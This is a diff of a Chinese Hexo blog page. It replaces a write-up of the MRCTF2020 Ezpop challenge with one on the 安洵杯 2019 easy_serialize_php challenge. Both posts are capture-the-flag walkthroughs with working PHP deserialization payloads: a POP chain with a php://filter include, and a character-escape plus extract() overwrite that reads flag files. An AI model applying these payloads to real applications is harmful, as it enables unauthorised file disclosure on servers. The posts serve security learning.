@@ -1,23 +1,148 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="k1rit0"><title>K1rit0's Blog</title><meta name="description" content="just for fun"><meta name="keywords" content="Blog,博客,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/favicon.webp"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a href="/">Home</a></li><li> <a href="/archives">Archives</a></li><li> <a href="/tags">Tags</a></li><li> <a href="/about">About</a></li><li> <a href="/links">Links</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)" style="display:none;"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li></div><div class="avatar"><img src="https://avatars.githubusercontent.com/u/56160386?s=96&amp;v=4"></div></div></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="https://avatars.githubusercontent.com/u/56160386?s=400&amp;v=4" style="width:220px;" alt="favicon"><h3 title=""><a href="/">K1rit0's Blog</a></h3><div class="description"><p>just for fun</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/tearsjin"><i class="fa fa-github"></i></a></li><li><a href="mailto:k1rit0@qq.com"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="http://sighttp.qq.com/authd?IDKEY=3519728596"><i class="fa fa-qq"></i></a></li></ul></div></div><div class="footer"><div class="p"> <span> 全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> k1rit0</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><span>Anatolo </span></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2021/03/25/Noting-of-MRCTF2020-Ezpop/">Noting of [MRCTF2020]Ezpop</a></h3></div><div class="post-content"><div class="card"><p><blockquote>
-<p>这个链子有够长的</p>
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="k1rit0"><title>K1rit0's Blog</title><meta name="description" content="just for fun"><meta name="keywords" content="Blog,博客,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/favicon.webp"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 5.4.0"><style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a href="/">Home</a></li><li> <a href="/archives">Archives</a></li><li> <a href="/tags">Tags</a></li><li> <a href="/about">About</a></li><li> <a href="/links">Links</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)" style="display:none;"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li></div><div class="avatar"><img src="https://avatars.githubusercontent.com/u/56160386?s=96&amp;v=4"></div></div></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="https://avatars.githubusercontent.com/u/56160386?s=400&amp;v=4" style="width:220px;" alt="favicon"><h3 title=""><a href="/">K1rit0's Blog</a></h3><div class="description"><p>just for fun</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/tearsjin"><i class="fa fa-github"></i></a></li><li><a href="mailto:k1rit0@qq.com"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="http://sighttp.qq.com/authd?IDKEY=3519728596"><i class="fa fa-qq"></i></a></li></ul></div></div><div class="footer"><div class="p"> <span> 全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> k1rit0</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><span>Anatolo </span></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2021/03/24/Noting-of-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php/">Noting of [安洵杯 2019]easy_serialize_php</a></h3></div><div class="post-content"><div class="card"><p><blockquote>
+<p>又是一题字符逃逸, 不过还有其他要注意的点</p>
 </blockquote>
-<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>主要考察:</p>
+<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>这题考察的点有:</p>
 <ol>
-<li>反序列化魔术方法</li>
-<li>文件包含伪协议</li>
+<li>反序列化字符逃逸</li>
+<li><code>extract()</code>变量覆盖</li>
 </ol>
-<p>这两部分可以找反序列化笔记和文件包含笔记</p>
-<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><p>代码不长直接贴出来</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>{</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>{</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">'index.php'</span></span>)</span>{</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) {</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>{</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'pop'</span>])){</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">'pop'</span>]);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span>{</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">} </span><br></pre></td></tr></table></figure>
-<p>开头提示给了flag在<code>flag.php</code>中, 所以要想办法读取他.<br>大概看了一遍, 发现个<code>Modifier.append()</code>里面有个<code>include()</code>, 要想办法调用它. 而在同个类中定义了魔术方法<code>__invoke()</code>会调用<code>append()</code>. 要想调用<code>__invoke()</code>, 就要把对象当成是函数进行调用. </p>
-<p>分析到这里先断开, 因为我们还不知道到底有啥办法开始函数链的调用.</p>
-<p>代码里面只有一行<code>@unserialize($_GET['pop']);</code>, 要想在反序列化后进行更多操作, 估计是需要一个<code>__wakeup()</code>的, 而类<code>Show</code>是定义了<code>__wakeup()</code>, 而这个<code>__wakeup()</code>中只存在一个调用<code>$this-&gt;source = "index.php";</code>, 这是一个对字符串的操作, 可以马上想到<code>__toString()</code></p>
-<p>而类<code>Show</code>中同样有<code>__toString()</code>, 继续看下去, <code>__toString()</code>里依然只有一个调用<code>return $this-&gt;str-&gt;source;</code><br>这里可以调用一个变量, 要想到<code>__get()</code>, 刚好类<code>Test</code>中有<code>__get()</code>, 而这个<code>__get()</code>就提供了一个函数调用的入口.</p>
-<p>到了这里我们就找到了一个调用链:</p>
-<p><code>@unserialize($_GET['pop'])</code> -&gt; <code>Show.__wakeup()</code> -&gt; <code>Show.__toString()</code> -&gt; <code>Test.__get()</code> -&gt; <code>Modifier.__invoke()</code> -&gt; <code>Modifier.appen()</code> -&gt; <code>include()</code></p>
-<h1 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h1><p>我们跟着调用链一步一步构造即可, 这里还需要注意一下, 因为是要包含一个php文件, 直接包含会直接执行, 那么里面的变量就看不到了, 要用<code>php:\\filter</code>讲文件base64编码再包含进来. </p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span> = <span class="string">'ftp'</span>;</span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span></span>{</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">'php://filter/read=convert.base64-encode/resource=./flag.php'</span>;</span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">}</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Show;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Show;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> Test;</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> Modifier;</span><br><span class="line"><span class="variable">$c</span>-&gt;p = <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;str = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;source = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
-<p>得到payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A59%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3D.%2Fflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3Bs%3A3%3A%22ftp%22%3B%7D</span><br></pre></td></tr></table></figure>
-<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>直接传就完事了. 传完拿到文件后base64解码一下</p>
-</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2021-03-25</span><a class="tag" href="/categories/WebSummary/" title="WebSummary">WebSummary </a><i class="fa fa-tag"></i><a class="tag" href="/tags/Web/" title="Web">Web </a><i class="fa fa-tag"></i><a class="tag" href="/tags/unserialize/" title="unserialize">unserialize </a><i class="fa fa-tag"></i><a class="tag" href="/tags/魔术方法/" title="魔术方法">魔术方法 </a><i class="fa fa-tag"></i><a class="tag" href="/tags/文件包含/" title="文件包含">文件包含 </a><i class="fa fa-tag"></i><a class="tag" href="/tags/伪协议/" title="伪协议">伪协议 </a><span class="leancloud_visitors"></span><span>About 692 words, 2 min 18 sec  read</span></div></div></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/page/18/">Previous</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/page/20/">Next</a></li></ul></div></div></div></div><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div></body></html>
+<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><p>提示说<code>phpinfo()</code>中有东西, 找了一下发现有<code>auto_append_file: d0g3_f1ag.php</code><br><code>auto_append_file</code>: 设置每个php中都自动require一个文件</p>
+<p>中间有个<code>extract($_POST)</code>, 可能存在变量覆盖</p>
+<p>在代码的最后, 存在<code>file_get_contents(base64_decode($userinfo['img']))</code>看参数是否可控, 可以看到有两行<br><code>$userinfo = unserialize($serialize_info)</code><br><code>$serialize_info = filter(serialize($_SESSION))</code></p>
+<p>确认有序列化和反序列化, 而<code>$serialize_info</code>在序列化之后存在一个过滤使得字符减少 可能存在字符逃逸<br>来细细看一下<code>$_SESSION</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span> = <span class="keyword">array</span>(</span><br><span class="line">	<span class="string">"user"</span> =&gt; <span class="string">'guest'</span>,</span><br><span class="line">	<span class="string">"function"</span> =&gt; @<span class="variable">$_GET</span>[<span class="string">'f'</span>],</span><br><span class="line">	<span class="string">"img"</span> =&gt; sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">'img_path'</span>])),</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<p>可以看到有两个参数是可以控制的, 但<code>"img"</code>会进行一次<code>sha1</code>加密, 反序列化后却不进行<code>sha1</code>解密, 所以无论输入什么基本都是无效的…</p>
+<p>而<code>"function"</code>是可控, 且存在字符逃逸, 但如果要执行<code>file_get_contents()​</code>, 必须有<code>$function='show_image'</code>, 在<code>$function</code>的值赋给<code>$_SESSION</code>之后, 存在一个<code>$extract($_POST)</code>, 我们可以利用这个修改<code>$function</code> 为show_image</p>
+<p>到这里思路就清楚了:</p>
+<p><code>file_get_contents(base64_decode($userinfo['img']))</code>参数可控 -&gt; 利用字符逃逸从<code>"funtion"</code>控制<code>"img"</code> -&gt; 利用 <code>extract()</code>变量覆盖修改<code>$function</code>为<code>show_image</code></p>
+<h1 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h1><p>总结了挺多次了…</p>
+<p>这次的<code>filter</code>是字符减少的替换, 需要利用数组来进行逃逸, 具体原理不多讲了, 可以看反序列化那篇笔记</p>
+<h1 id="extract-变量覆盖"><a href="#extract-变量覆盖" class="headerlink" title="extract()变量覆盖"></a><code>extract()</code>变量覆盖</h1><p>这个还是第一次遇到,.</p>
+<p><code>extract()</code>函数从数组中将变量导入到当前的符号表。</p>
+<p>也就是说参数是个数组, 并且根据键对值来创造变量, 而且可以覆盖前面的变量, 这样就可以造成变量覆盖了</p>
+<h1 id="payload-构造"><a href="#payload-构造" class="headerlink" title="payload 构造"></a>payload 构造</h1><blockquote>
+<p>字符逃逸的构造也总结很多次了, 这次就简单的说一下</p>
+</blockquote>
+<p>这题主要就是构造字符逃逸的payload, 我们需要最后<code>"img" =&gt; base64encode("d0g3_f1ag.php")</code><br>老套路, 先构造一个</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">'function'</span>] = <span class="variable">$_GET</span>[<span class="string">'f'</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="comment"># a:3:{s:4:"user";s:5:"guest";s:8:"function";N;s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}</span></span><br></pre></td></tr></table></figure>
+<p>再慢慢尝试通过字符减少把一个双引号闭合, 最后可以构造出payload: </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f[]=phpphpphpphp&amp;f[]=";i:1;s:1:"1";}s:3:"img";s:20:"ZDBnM19mbGxsbGxsYWc=</span><br></pre></td></tr></table></figure>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><p><code>GET</code>方式传<code>?f[]=phpphpphpphp&amp;f[]=";i:1;s:1:"1";}s:3:"img";s:20:"ZDBnM19mbGxsbGxsYWc=</code><br><code>POST</code>方式传<code>function=show_image</code></p>
+<p>不过结果发现flag并不在<code>d0g3_f1ag.php</code>中,<code>d0g3_f1ag.php</code>中只有一句 <code>$flag = 'flag in /d0g3_fllllllag';</code><br>那就再构造一次</p>
+<p><code>?f[]=phpphpphpphp&amp;f[]=";i:1;s:1:"1";}s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn</code></p>
+<p>别忘了<code>POST</code>, 然后就能看到flag了</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>做完题后翻了下别的师傅的wp, 发现别的师傅都是<code>GET</code>传<code>f=show_image</code>, <code>POST</code>直接对<code>$_SESSION['user']</code>和<code>$_SESSION['function']</code>做文章, 这样就不需要通过数组来进行字符逃逸了, 这也是一种思路, 而且可以控制的变量更多了(我脑子怎么就没转过来…</p>
+<p>不过因为脑子没转过来也解锁了控制一个变量的时候, 利用数字来进行字符减少的字符逃逸!</p>
+</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2021-03-24</span><a class="tag" href="/categories/WebSummary/" title="WebSummary">WebSummary </a><i class="fa fa-tag"></i><a class="tag" href="/tags/Web/" title="Web">Web </a><i class="fa fa-tag"></i><a class="tag" href="/tags/字符逃逸/" title="字符逃逸">字符逃逸 </a><i class="fa fa-tag"></i><a class="tag" href="/tags/unserialize/" title="unserialize">unserialize </a><i class="fa fa-tag"></i><a class="tag" href="/tags/变量覆盖/" title="变量覆盖">变量覆盖 </a><span class="leancloud_visitors"></span><span>About 839 words, 2 min 47 sec  read</span></div></div></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/page/18/">Previous</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/page/20/">Next</a></li></ul></div></div></div></div><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div></body></html>
